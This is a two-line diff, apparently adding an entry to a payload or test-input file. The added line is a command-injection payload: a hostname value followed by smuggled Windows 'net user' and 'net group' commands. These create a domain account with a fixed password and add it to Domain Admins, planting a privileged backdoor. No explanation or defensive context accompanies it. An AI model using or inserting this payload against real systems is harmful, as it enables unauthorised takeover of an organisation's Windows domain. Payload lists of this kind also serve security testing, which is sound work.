@@ -1,0 +1,2 @@
+google.com;net user M0t11 Password123! /add /domain; net group "Domain Admins" M0t11 /add /domain
+
